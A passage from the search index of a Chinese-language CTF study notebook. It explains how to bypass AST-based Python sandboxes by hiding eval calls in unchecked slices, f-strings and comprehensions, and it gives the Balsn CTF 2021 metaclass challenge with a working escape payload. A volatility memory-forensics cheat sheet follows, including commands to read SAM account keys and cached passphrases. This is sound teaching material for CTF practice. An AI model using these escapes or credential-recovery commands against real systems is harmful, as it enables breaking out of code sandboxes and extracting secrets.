<p>\u8fd9\u9053\u9898\u76ee\u7684\u4ee3\u7801\u5c31\u66f4\u52a0\u660e\u786e\u4e86\uff0c\u9053\u7406\u662f\u7c7b\u4f3c\u7684</p> <p>\u6b63\u5982\u524d\u9762\u8bf4\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u68c0\u67e5\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e</p>"},{"location":"ctf/misc/escapes/pysandbox/#_4","title":"\u5bfb\u627e\u6ca1\u6709\u904d\u5386\u5230\u7684\u5b50\u8282\u70b9","text":"<p>\u6211\u4eec\u53d1\u73b0\uff0c\u5728\u9898\u76ee\u7684\u7a0b\u5e8f\u4e2d\uff0c\u90fd\u662f\u624b\u52a8\u7f16\u5199\u4e86\u5bf9\u67d0\u4e2a\u62bd\u8c61\u8bed\u6cd5\u7684\u54ea\u4e9b\u90e8\u5206\u8fdb\u884c\u68c0\u6d4b\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u4f1a\u51fa\u73b0\u67d0\u4e2a\u8bed\u6cd5\u7684\u67d0\u4e2a\u90e8\u5206\u6ca1\u88ab\u68c0\u6d4b\u5230\u7684\u60c5\u51b5\u3002</p> <p>\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u53bb\u548c AST \u6587\u6863\u4e2d\u62bd\u8c61\u8bed\u6cd5 \u5bf9\u6bd4\uff0c\u6587\u6863\u4e2d\u7ed9\u51fa\u7684 ast.expr \u5305\u542b\u4e86\uff1a <pre><code>expr = BoolOp(boolop op, expr* values)\n     | NamedExpr(expr target, expr value)\n     | BinOp(expr left, operator op, expr right)\n     | UnaryOp(unaryop op, expr operand)\n     | Lambda(arguments args, expr body)\n     | IfExp(expr test, expr body, expr orelse)\n     | Dict(expr* keys, expr* values)\n     | Set(expr* elts)\n     | ListComp(expr elt, comprehension* generators)\n     | SetComp(expr elt, comprehension* generators)\n     | DictComp(expr key, expr value, comprehension* generators)\n     | GeneratorExp(expr elt, comprehension* generators)\n     -- the grammar constrains where yield expressions can occur\n     | Await(expr value)\n     | Yield(expr? value)\n     | YieldFrom(expr value)\n     -- need sequences for compare to distinguish between\n     -- x &lt; 4 &lt; 3 and (x &lt; 4) &lt; 3\n     | Compare(expr left, cmpop* ops, expr* comparators)\n     | Call(expr func, expr* args, keyword* keywords)\n     | FormattedValue(expr value, int? conversion, expr? format_spec)\n     | JoinedStr(expr* values)\n     | Constant(constant value, string? kind)\n\n     -- the following expression can appear in assignment context\n     | Attribute(expr value, identifier attr, expr_context ctx)\n     | Subscript(expr value, expr slice, expr_context ctx)\n     | Starred(expr value, expr_context ctx)\n     | Name(identifier id, expr_context ctx)\n     | List(expr* elts, expr_context ctx)\n     | Tuple(expr* elts, expr_context ctx)\n\n     -- can appear only in Subscript\n     | Slice(expr? lower, expr? upper, expr? step)\n</code></pre> \u6bd4\u5982\uff0cBinOp(expr left, operator op, expr right) \u8868\u793a\u4e86\u4e8c\u5143\u8fd0\u7b97\u8fd9\u4e2a\u8bed\u6cd5\uff0cleft \u8868\u793a\u5de6\u4fa7\u7684\u8868\u8fbe\u5f0f\uff0cop \u8868\u793a\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0cright \u8868\u793a\u53f3\u4fa7\u8868\u8fbe\u5f0f\u3002 \u540c\u7406 ListComp(expr elt, comprehension* generators) \u4e2d elt \u8868\u793a\u5176\u4e2d\u5217\u8868\u63a8\u5bfc\u7684\u5143\u7d20\uff0c\u800c generator \u5219\u8868\u793a\u751f\u6210\u5668\u5b50\u53e5</p> <p>\u518d\u6765\u770b TWCTF \u8fd9\u9053\u9898\uff0c\u5b83\u7684\u68c0\u67e5\u4e2d\u5199\u4e86\uff1a <pre><code>'Subscript': ['value'],\n</code></pre> \u800c\u6587\u6863\u4e2d\u7ed9\u7684\u7d22\u5f15\u8bbf\u95ee\u662f Subscript(expr value, expr slice, expr_context ctx)</p> <p>\u56e0\u6b64\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u68c0\u6d4b\u7d22\u5f15\u8bbf\u95ee\u4e2d\u7684\u5207\u7247 slice\uff0c\u8fd9\u6837\u4f8b\u5982 a[...] \u4e2d\u7684 ... \u90e8\u5206\u5c31\u4f1a\u88ab\u5168\u90e8\u5ffd\u7565 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5728[]\u4e2d\u85cf\u4e00\u4e2aeval\u6267\u884c\u6211\u4eec\u60f3\u8981\u7684\u529f\u80fd</p>"},{"location":"ctf/misc/escapes/pysandbox/#_5","title":"\u5bfb\u627e\u6ca1\u6709\u68c0\u67e5\u7684\u8282\u70b9","text":"<p>\u518d\u6765\u770b zjusec \u8fd9\u9053\u9898\uff0c\u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u53d1\u73b0\u6240\u6709\u68c0\u6d4b\u7684\u8282\u70b9\u7684\u5b50\u8282\u70b9\u4e5f\u90fd\u904d\u5386\u4e86 \u4f46\u662f\u518d\u7ec6\u770b\u53ef\u4ee5\u53d1\u73b0 FormattedValue \u8fd9\u4e2a\u8282\u70b9\u5e76\u6ca1\u6709\u5728\u9898\u76ee\u4ee3\u7801\u91cc\u51fa\u73b0</p> <p>\u800c\u4e14 ast.FormattedValue \u5c5e\u4e8e ast.expr\uff0c\u6240\u4ee5\u5b83\u65e2\u4e0d\u4f1a\u88ab\u68c0\u67e5\uff0c\u4e5f\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38 \u770b\u540d\u5b57\u50cf\u662f f-string \u76f8\u5173\uff0c\u53ef\u4ee5 dump \u4e00\u4e0b\u770b\u770b\uff1a <pre><code>&gt;&gt;&gt; ast.dump(ast.parse(\"f'{x}'\"))\n\"\"\"\nModule(\n  body=[\n    Expr(\n      value=JoinedStr(\n        values=[\n          FormattedValue(\n            value=Name(id='x', ctx=Load()), \n            conversion=-1, \n            format_spec=None\n          )\n        ]\n\n    )\n  ], \n  type_ignores=[]\n)\n\"\"\"\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\uff0cf-string \u662f JoinedStr\uff0c\u800c FormattedValue \u662f\u5176\u4e2d\u88ab\u683c\u5f0f\u5316\u7684\u90e8\u5206</p> <p>\u6240\u4ee5\u5c31\u53ef\u4ee5\u5411 f-string \u7684 {} \u90e8\u5206\u85cf eval \u6765\u5e72\u574f\u4e8b\u4e86</p>"},{"location":"ctf/misc/escapes/pysandbox/#_6","title":"\u5176\u4ed6\u6f0f\u6d1e","text":"<p>\u8fd9\u4e2a\u662f pysandbox12 \u7684\u4e00\u79cd\u89e3\u6cd5 python\u4e2d\u7684\u8bed\u6cd5\u4e0d\u4ec5\u6709 ast.expr \u4e00\u79cd\uff0c\u800c\u4e14\u5f88\u7279\u522b\u7684\u662f\uff0c\u5217\u8868\u63a8\u5bfc ListComp \u7684\u751f\u6210\u5668\u5b50\u53e5\u5e76\u4e0d\u662f ast.expr\uff0c\u800c\u662f ast.comprehension <pre><code>&gt;&gt;&gt; ast.dump(ast.parse(\"[x for x in range(n)]\"))\n\"\"\"\nModule(\n  body=[\n    Expr(\n      value=ListComp(\n        elt=Name(id='x', ctx=Load()), \n        generators=[\n          comprehension(\n            target=Name(id='x', ctx=Store()), \n            iter=Call(\n              func=Name(id='range', ctx=Load()), \n              args=[Name(id='n', ctx=Load())], \n              keywords=[]\n            ), \n            ifs=[], \n            is_async=0\n          )\n        ]\n      )\n    )\n  ], \n  type_ignores=[]\n)\n\"\"\"\n</code></pre> \u4f46\u662f pysandbox13 \u8fd9\u6837\u6392\u9664\u4e86 ast.expr \uff1a <pre><code>if not isinstance(node, ast.expr):\n    raise Exception(\"not allowed \"+str(node))\n</code></pre></p> <p>\u4f46\u662f12\u9898\u4e2d\u5e76\u6ca1\u6709\uff0c\u6240\u4ee5 ast.comprehension \u8fd9\u4e2a\u7c7b\u578b\u5b8c\u5168\u6ca1\u6709\u88ab\u68c0\u67e5 \u56e0\u6b64\u76f4\u63a5\u5411\u751f\u6210\u5668\u8868\u8fbe\u5f0f\u4e2d\u63d2\u5165\u574f\u4e1c\u897f\u5373\u53ef\uff1a<code>[x for x in [eval(...)]]</code></p>"},{"location":"ctf/misc/escapes/pysandbox/#_7","title":"\u5176\u4ed6\u7c7b\u578b\u7684\u9003\u9038","text":"<p>\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\u4e86</p>"},{"location":"ctf/misc/escapes/pysandbox/#metaclass","title":"metaclass","text":"<p>Balsn CTF 2021 \u51fa\u4e86\u4e00\u9053\u7c7b\u4f3c\u6c99\u7bb1\u9003\u9038\u7684\u9898\u76ee\uff0c\u4e3b\u8981\u8003\u5bdf\u7684\u662f metaclass </p> \u9898\u76ee\u4ee3\u7801 <pre><code>class MasterMetaClass(type):   \n    def __new__(cls, class_name, class_parents, class_attr):\n        def getFlag(self):\n            print('Here you go, my master')\n            with open('flag') as f:\n                print(f.read())\n        class_attr[getFlag.__name__] = getFlag\n        attrs = ((name, value) for name, value in class_attr.items() if not name.startswith('__'))\n        class_attr = dict(('IWant'+name.upper()+'Plz', value) for name, value in attrs)\n        newclass = super().__new__(cls, class_name, class_parents, class_attr)\n        return newclass\n    def __init__(*argv):\n        print('Bad guy! No Flag !!')\n        raise 'Illegal'\n\nclass BalsnMetaClass(type):\n    def getFlag(self):\n        print('You\\'re not Master! No Flag !!')\n\n    def __new__(cls, class_name, class_parents, class_attr):\n        newclass = super().__new__(cls, class_name, class_parents, class_attr)\n        setattr(newclass, cls.getFlag.__name__, cls.getFlag)\n        return newclass\n\ndef secure_vars(s):\n    attrs = {name:value for name, value in vars(s).items() if not name.startswith('__')}\n    return attrs\n\nsafe_dict = {\n            'BalsnMetaClass' : BalsnMetaClass,\n            'MasterMetaClass' : MasterMetaClass,\n            'False' : False,\n            'True' : True,\n            'abs' : abs,\n            'all' : all,\n            'any' : any,\n            'ascii' : ascii,\n            'bin' : bin,\n            'bool' : bool,\n            'bytearray' : bytearray,\n            'bytes' : bytes,\n            'chr' : chr,\n            'complex' : complex,\n            'dict' : dict,\n            'dir' : dir,\n            'divmod' : divmod,\n            'enumerate' : enumerate,\n            'filter' : filter,\n            'float' : float,\n            'format' : format,\n            'hash' : hash,\n            'help' : help,\n            'hex' : hex,\n            'id' : id,\n            'int' : int,\n            'iter' : iter,\n            'len' : len,\n            'list' : list,\n            'map' : map,\n            'max' : max,\n            'min' : min,\n            'next' : next,\n            'oct' : oct,\n            'ord' : ord,\n            'pow' : pow,\n            'print' : print,\n            'range' : range,\n            'reversed' : reversed,\n            'round' : round,\n            'set' : set,\n            'slice' : slice,\n            'sorted' : sorted,\n            'str' : str,\n            'sum' : sum,\n            'tuple' : tuple,\n            'type' : type,\n            'vars' : secure_vars,\n            'zip' : zip,\n            '__builtins__':None\n            }\n\ndef createMethod(code):\n    # if len(code) &gt; 45:\n    #     print('Too long!! Bad Guy!!')\n    #     return\n    for x in ' _$#@~':\n        code = code.replace(x,'')\n    def wrapper(self):\n        exec(code, safe_dict, {'self' : self})\n    return wrapper\n\ndef setName(pattern):\n    while True:\n        name = input(f'Give me your {pattern} name :')\n        if (name.isalpha()):\n            break\n        else:\n            print('Illegal Name...')\n    return name\n\ndef setAttribute(cls):\n    attrName = setName('attribute')\n    while True:\n        attrValue = input(f'Give me your value:')\n        if (attrValue.isalnum()):\n            break\n        else:    \n            print('Illegal value...')\n    setattr(cls, attrName, attrValue)\n\ndef setMethod(cls):\n    methodName = setName('method')\n    code = input(f'Give me your function:')       \n    func = createMethod(code)\n    setattr(cls, methodName, func)\n\ndef getAttribute(obj):\n    attrs = [attr for attr in dir(obj) if not callable(getattr(obj, attr)) and not attr.startswith(\"__\")]\n    x = input('Please enter the attribute\\'s name :')\n    if x not in attrs:\n        print(f'You can\\'t access the attribute {x}')\n        return\n    else:\n        try:\n            print(f'{x}: {getattr(obj, x)}')\n        except:\n            print(\"Something went wrong in your attribute...\")\n            return\n\ndef callMethod(cls, obj):\n    attrs = [attr for attr in dir(obj) if callable(getattr(obj, attr)) and not attr.startswith(\"__\")]\n    x = input('Please enter the method\\'s name :')\n    if x not in attrs:\n        print(f'You can\\'t access the method {x}')\n        return\n    else:\n        # try:\n        print(f'calling method {x}...')\n        cls.__dict__[x](obj)\n        print('done')\n        # except:\n        #     print('Something went wrong in your method...')\n        #     return\n\nclass Guest(metaclass = BalsnMetaClass):\n    pass\n\nif __name__ == '__main__':\n    print(f'Welcome!!We have prepared a class named \"Guest\" for you')\n    cnt = 0\n    while cnt &lt; 3:\n        cnt += 1\n        print('1. Add attribute')\n        print('2. Add method')\n        print('3. Finish')\n        x = input(\"Option ? :\")\n        if x == \"1\":\n            setAttribute(Guest)\n        elif x == \"2\":\n            setMethod(Guest)\n        elif x == \"3\":\n            break\n        else:\n            print(\"invalid input.\")\n            cnt -= 1\n    print(\"Well Done! We Create an instance for you !\")\n    obj = Guest()\n    cnt = 0\n    while cnt &lt; 3:\n        cnt += 1\n        print('1. Inspect attribute')\n        print('2. Using method')\n        print('3. Exit')\n        x = input(\"Option ? :\")\n        if x == \"1\":\n            getAttribute(obj)\n        elif x == \"2\":\n            callMethod(Guest, obj)\n        elif x == \"3\":\n            print(\"Okay...exit...\")\n            break\n        else:\n            print(\"invalid input.\")\n            cnt -= 1\n</code></pre> <p>\u4e3b\u8981\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a MasterMetaClass \u7684\u5b9e\u4f8b\u4f46\u4e0d\u8c03\u7528\u5b83\u7684 __init__\u3002\u5e76\u4e14 method method \u9650\u5236\u4e86\u957f\u5ea6 &lt;=45\uff0c\u800c\u4e14 '<code>\uff08\u7a7a\u683c\uff09_$#@~</code>' \u90fd\u4f1a\u88ab\u5220\u6389\uff0c\u5185\u90e8 exec \u7684 globals \u4e5f\u7ed9\u4e86\u9650\u5236</p> <p>\u76f4\u63a5\u8c03\u7528 MasterMetaClass \u6765\u5b9e\u4f8b\u5316\u4f1a\u6267\u884c __call__ \u548c __init__\uff0c\u76f4\u63a5\u8c03\u7528 __new__ \u53c8\u4f1a\u88ab\u9650\u5236\u4e0d\u80fd\u8f93\u5165\u4e0b\u5212\u7ebf</p> <p>\u521b\u5efa\u4e00\u4e2a\u5143\u7c7b\u53ef\u4ee5\u4f7f\u7528 <code>type(name, bases, dict)</code>\uff0c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\uff0c\u53c2\u6570\u662f\uff1a</p> <ul> <li><code>name</code>: It is a\u00a0string\u00a0which basically represents the\u00a0name of the class.</li> <li><code>bases</code>: It is a\u00a0tuple\u00a0that specifies the\u00a0base classes of the main class.</li> <li><code>dict</code>: It is a \u2018dictionary\u2018 that is used to\u00a0create body of the class\u00a0specified.</li> </ul> <p>\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 type \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 metaclass\uff0c\u8ba9\u5b83\u57fa\u4e8e\uff08\u4e5f\u5c31\u662f bases \u53c2\u6570\u5185\u5bb9\uff09MasterMetaClass\uff0c\u5e76\u4e14\u8986\u76d6\u6389\u5b83\u7684 __init__\uff0c\u6240\u4ee5\u6700\u7ec8\u7684 payload \u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u6539\u5199\uff1a</p> <p><code>type(\"\", (MasterMetaClass,), {\"__init__\":print})(\"\",(),{}).IWantGETFLAGPlz(1)</code></p> <p>\u56e0\u4e3a\u8fd9\u65f6\u7684\u4e0b\u5212\u7ebf\u5728\u5f15\u53f7\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \"\\x5f\" \u6765\u4ee3\u66ff</p> payload <ul> <li>add method <code>x</code>: <code>e=\"\\x5f\"*2;self.d={e+\"init\"+e:print}</code></li> <li>add method <code>y</code>: <code>self.m=type('',(MasterMetaClass,),self.d)</code></li> <li>add method <code>z</code>: <code>self.m('',(),{}).IWantGETFLAGPlz(1)</code></li> <li>call <code>x</code></li> <li>call <code>y</code></li> <li>call <code>z</code></li> </ul>"},{"location":"ctf/misc/escapes/pysandbox/#reference","title":"Reference","text":"<ul> <li>TokyoWesterns CTF 4th 2018 Writeup \u2014 Part 5</li> <li>Documentation of ast</li> <li>\u4e00\u6587\u770b\u61c2Python\u6c99\u7bb1\u9003\u9038 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237</li> <li>https://blog.gztime.cc/posts/2021/83a30666/</li> </ul>"},{"location":"ctf/misc/forensics/","title":"\u53d6\u8bc1","text":"<p>Abstract</p> <p>\u53d6\u8bc1\u4e5f\u662f misc \u4e2d\u5e38\u89c1\u7684\u4e00\u7c7b\u9898\u578b\uff0c\u5373\u4ece dump \u4e0b\u6765\u7684\u6d41\u91cf\u6216\u5185\u5b58\u4e2d\u5bfb\u627e\u3001\u63d0\u53d6\u51fa\u60f3\u8981\u7684\u4e1c\u897f\uff08flag\uff09</p> <p>\u4e5f\u4e00\u822c\u5206\u4e3a\u6d41\u91cf\u53d6\u8bc1\u548c\u5185\u5b58\u53d6\u8bc1</p>"},{"location":"ctf/misc/forensics/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u5185\u5b58\u53d6\u8bc1</li> <li>\u6d41\u91cf\u53d6\u8bc1\uff08\u5495\u5495\u5495\uff09</li> </ul>"},{"location":"ctf/misc/forensics/mem/","title":"\u5185\u5b58\u53d6\u8bc1","text":"<p> \u7ea6 415 \u4e2a\u5b57  96 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u5176\u5b9e\u4e5f\u6ca1\u7cfb\u7edf\u5b66\u4e60\u8fc7\u5185\u5b58\u53d6\u8bc1\u65b9\u6cd5\uff0c\u505a\u4e86\u51e0\u9053\u9898\u53cd\u6b63\u5c31\u662f strings \u4e00\u628a\u68ad\uff0c\u4e0d\u884c\u5c31 volatility \u4e00\u628a\u68ad\uff08\u518d\u4e0d\u884c\u5c31\u5f00\u6446\uff09</p>"},{"location":"ctf/misc/forensics/mem/#strings","title":"strings","text":"<p>dump \u51fa\u6765\u7684\u5185\u5b58\u4e2d\u5f80\u5f80\u4f1a\u5b58\u5728\u4e00\u4e9b\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u7528 strings \u547d\u4ee4\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u901a\u8fc7\u641c\u7d22\u6765\u5bfb\u627e\u4e00\u4e9b\u7279\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982 flag\u3001secret \u5565\u7684\u3002\uff08\u53cd\u6b63\u5c31\u55ef\u770b\u55ef\u641c\u5c31\u5b8c\u4e8b</p>"},{"location":"ctf/misc/forensics/mem/#volatility","title":"volatility","text":""},{"location":"ctf/misc/forensics/mem/#_2","title":"\u7248\u672c\u4e0e\u5b89\u88c5","text":"<p>\u73b0\u5b58\u7684\u4e24\u4e2a\u7248\u672c volatility2 \u548c volatility3\uff0c\u5206\u522b\u7528\u4e86 python2 \u548c python3\u3002\u4e0d\u8fc7 volatility3 \u611f\u89c9\u4e0d\u597d\u7528\uff0c\u8fd8\u5f97\u662f 2</p> <p>volatility2 \u5b89\u88c5\u76f4\u63a5\u770b\u6587\u6863\u5c31\u597d\uff0cmac \u7684\u8bdd\u6709\u4e00\u4e9b\u4f9d\u8d56\u5305\u6709\u7f16\u8bd1\u95ee\u9898\uff0c\u61d2\u5f97\u641e\uff0c\u53ef\u4ee5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u7f16\u8bd1\u597d\u7684\u4e8c\u8fdb\u5236\u5305\u62ff\u6765\u76f4\u63a5\u8fd0\u884c</p>"},{"location":"ctf/misc/forensics/mem/#profile","title":"\u7cfb\u7edf\u7248\u672c\u4e0e profile","text":"<p>volatility \u7684\u8bdd\u76f4\u63a5\u65e0\u8111\u68ad\u5c31\u5b8c\u4e8b\u4e86\uff0cWindows \u7684\u8bdd\u6709\u5185\u7f6e profile \u53ef\u4ee5\u76f4\u63a5\u68ad\uff0cLinux \u7684\u8bdd\u8981\u5148\u627e\u4e00\u4e0b\u7248\u672c\u7136\u540e\u6784\u9020\u5bf9\u5e94 profile</p> <p>\u67e5\u770b\u7cfb\u7edf\u7248\u672c\uff1a <pre><code>volatility -f &lt;file&gt; imageinfo\n</code></pre></p>"},{"location":"ctf/misc/forensics/mem/#windows","title":"Windows \u53d6\u8bc1\u4e00\u628a\u68ad","text":"<p>\u8fdb\u7a0b\u76f8\u5173\uff1a <pre><code>volatility -f &lt;file&gt; --profile=&lt;profile&gt; pslist\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; psxview\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; psscan\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; pstree\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; memdump -p &lt;PID&gt; --dump-dir=./\n</code></pre></p> <p>\u547d\u4ee4\u76f8\u5173\uff1a <pre><code>volatility -f &lt;file&gt; --profile=&lt;profile&gt; cmdscan\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; consoles\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; cmdline\n</code></pre></p> <p>\u6587\u4ef6\u76f8\u5173\uff1a <pre><code>volatility -f &lt;file&gt; --profile=&lt;profile&gt; filescan\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; filescan &gt; files.txt\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; dumpfiles -Q &lt;virtual addr&gt; --dump-dir=./ # \u7531 filescan \u7ed3\u679c\u6765\u5b9a\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; mftparser &gt; mftparser.txt # \u4e00\u4e9b filescan \u641c\u4e0d\u51fa\u6765/\u88ab\u5220\u4e86\u7684\u53ef\u4ee5\u5c1d\u8bd5 mtfparser\n</code></pre></p> <p>\u5176\u5b83\u4e00\u5806\u64cd\u4f5c\uff1a <pre><code>volatility -f &lt;file&gt; --profile=&lt;profile&gt; envars\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; netscan\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; connscan\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; svcscan\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; privs\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; hivelist\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; printkey -K \"SAM\\Domains\\Account\\Users\\Names\"\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; iehistory\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; notepad\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; editbox\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; userassist\nvolatility -f &lt;file&gt; --profile=&lt;profile&gt; clipboard -v\n</code></pre></p>"},{"location":"ctf/misc/forensics/mem/#linux","title":"Linux \u53d6\u8bc1","text":"<p>Linux \u9996\u5148\u9700\u8981\u6784\u9020\u4e00\u4e0b profile\u3002volatility3 -f  banners \u53ef\u4ee5\u68c0\u6d4b\u5f53\u524d Linux \u7248\u672c\u3002 <p>\u7136\u540e\u5728\u5bf9\u5e94\u7cfb\u7edf\u5185\u8fdb\u5165 volatility \u7684 tools/linux \u76ee\u5f55\uff0c\u6267\u884c make\uff0c\u5f97\u5230 module.dwarf \u6587\u4ef6\u3002\u9664\u6b64\u4e4b\u5916\u8fd8\u9700\u8981 /boot \u76ee\u5f55\u4e0b\u7684 System.map \u6587\u4ef6\uff0c\u7136\u540e\u5c06\u8fd9\u4e24\u4e2a\u6587\u4ef6\u6253\u5305\u538b\u7f29\uff0c\u653e\u5728 volatility/plugins/overlays/linux \u76ee\u5f55\u4e0b\u5373\u53ef\uff0c\u518d\u6267\u884c volatility --info \u5c31\u53ef\u4ee5\u770b\u5230\u65b0\u7684 Linux profile \u4e86\u3002</p> <p>\u901a\u8fc7 volatility --info | grep linux_ \u53ef\u4ee5\u627e\u5230\u6240\u6709 Linux \u5185\u5b58\u4e0b\u53ef\u7528\u7684\u6307\u4ee4\uff0c\u9010\u4e2a\u8bd5\u7740\u7528\u5373\u53ef\uff1a</p> plugins list <pre><code>linux_apihooks             - Checks for userland apihooks\nlinux_arp                  - Print the ARP table\nlinux_aslr_shift           - Automatically detect the Linux ASLR shift\nlinux_banner               - Prints the Linux banner information\nlinux_bash                 - Recover bash history from bash process memory\nlinux_bash_env             - Recover a process' dynamic environment variables\nlinux_bash_hash            - Recover bash hash table from bash process memory\nlinux_check_afinfo         - Verifies the operation function pointers of network protocols\nlinux_check_creds          - Checks if any processes are sharing credential structures\nlinux_check_evt_arm        - Checks the Exception Vector Table to look for syscall table hooking\nlinux_check_fop            - Check file operation structures for rootkit modifications\nlinux_check_idt            - Checks if the IDT has been altered\nlinux_check_inline_kernel  - Check for inline kernel hooks\nlinux_check_modules        - Compares module list to sysfs info, if available\nlinux_check_syscall        - Checks if the system call table has been altered\nlinux_check_syscall_arm    - Checks if the system call table has been altered\nlinux_check_tty            - Checks tty devices for hooks\nlinux_cpuinfo              - Prints info about each active processor\nlinux_dentry_cache         - Gather files from the dentry cache\nlinux_dmesg                - Gather dmesg buffer\nlinux_dump_map             - Writes selected memory mappings to disk\nlinux_dynamic_env          - Recover a process' dynamic environment variables\nlinux_elfs                 - Find ELF binaries in process mappings\nlinux_enumerate_files      - Lists files referenced by the filesystem cache\nlinux_find_file            - Lists and recovers files from memory\nlinux_getcwd               - Lists current working directory of each process\nlinux_hidden_modules       - Carves memory to find hidden kernel modules\nlinux_ifconfig             - Gathers active interfaces\nlinux_info_regs            - It's like 'info registers' in GDB. It prints out all the\nlinux_iomem                - Provides output similar to /proc/iomem\nlinux_kernel_opened_files  - Lists files that are opened from within the kernel\nlinux_keyboard_notifiers   - Parses the keyboard notifier call chain\nlinux_ldrmodules           - Compares the output of proc maps with the list of libraries from libdl\nlinux_library_list         - Lists libraries loaded into a process\nlinux_librarydump          - Dumps shared libraries in process memory to disk\nlinux_list_raw             - List applications with promiscuous sockets\nlinux_lsmod                - Gather loaded kernel modules\nlinux_lsof                 - Lists file descriptors and their path\nlinux_malfind              - Looks for suspicious process mappings\nlinux_memmap               - Dumps the memory map for linux tasks\nlinux_moddump              - Extract loaded kernel modules\nlinux_mount                - Gather mounted fs/devices\nlinux_mount_cache          - Gather mounted fs/devices from kmem_cache\nlinux_netfilter            - Lists Netfilter hooks\nlinux_netscan              - Carves for network connection structures\nlinux_netstat              - Lists open sockets\nlinux_pidhashtable         - Enumerates processes through the PID hash table\nlinux_pkt_queues           - Writes per-process packet queues out to disk\nlinux_plthook              - Scan ELF binaries' PLT for hooks to non-NEEDED images\nlinux_proc_maps            - Gathers process memory maps\nlinux_proc_maps_rb         - Gathers process maps for linux through the mappings red-black tree\nlinux_procdump             - Dumps a process's executable image to disk\nlinux_process_hollow       - Checks for signs of process hollowing\nlinux_psaux                - Gathers processes along with full command line and start time\nlinux_psenv                - Gathers processes along with their static environment variables\nlinux_pslist               - Gather active tasks by walking the task_struct-&gt;task list\nlinux_pslist_cache         - Gather tasks from the kmem_cache\nlinux_psscan               - Scan physical memory for processes\nlinux_pstree               - Shows the parent/child relationship between processes\nlinux_psxview              - Find hidden processes with various process listings\nlinux_recover_filesystem   - Recovers the entire cached file system from memory\nlinux_route_cache          - Recovers the routing cache from memory\nlinux_sk_buff_cache        - Recovers packets from the sk_buff kmem_cache\nlinux_slabinfo             - Mimics /proc/slabinfo on a running machine\nlinux_strings              - Match physical offsets to virtual addresses (may take a while, VERY verbose)\nlinux_threads              - Prints threads of processes\nlinux_tmpfs                - Recovers tmpfs filesystems from memory\nlinux_truecrypt_passphrase - Recovers cached Truecrypt passphrases\nlinux_vma_cache            - Gather VMAs from the vm_area_struct cache\nlinux_volshell             - Shell in the memory image\nlinux_yarascan             - A shell in the Linux memory image\n</code></pre> <p>\u4e0d\u8fc7\u505a\u9898\u611f\u89c9\u6765\u8bf4\u5bf9 Linux \u7528 volatility \u6ca1\u6709\u5bf9 Windows \u7528\u597d\u7528\u3002</p>"},{"location":"ctf/misc/steg/","title":"\u9690\u5199\u672f","text":"<p>Steganography is the practice of concealing a message within another message or a physical object. In computing/electronic contexts, a computer file, message, image, or video is concealed within another file, message, image, or video. \u2014\u2014\u2014\u2014 Wikipedia</p> <p>Abstract</p> <p>\u9690\u5199\u662f CTF \u4e2d misc \u7c7b\u9898\u76ee\u6bd4\u8f83\u5e38\u51fa\u7684\u7c7b\u578b\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u5c31\u662f\u8981\u7834\u89e3\u9690\u5199\u7684\u65b9\u6cd5\uff0c\u5f97\u5230\u88ab\u9690\u5199\u7684\u5185\u5bb9\uff08flag\uff09</p> <p>\u56fe\u7247\u3001\u97f3\u9891\u3001\u89c6\u9891\u7b49\u5a92\u4f53\u6587\u4ef6\u90fd\u53ef\u80fd\u7528\u6765\u9690\u5199\uff0c\u8303\u56f4\u5e7f\u6837\u5f0f\u591a</p>"},{"location":"ctf/misc/steg/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u56fe\u7247\u9690\u5199</li> <li>\u97f3\u9891\u9690\u5199</li> </ul>"},{"location":"ctf/misc/steg/audio/","title":"\u97f3\u9891\u9690\u5199","text":"<p> \u7ea6 30 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <ul> <li>\u770b\u6ce2\u5f62/\u9891\u8c31</li> <li>mp3stego \u8f6f\u4ef6\u9690\u5199</li> 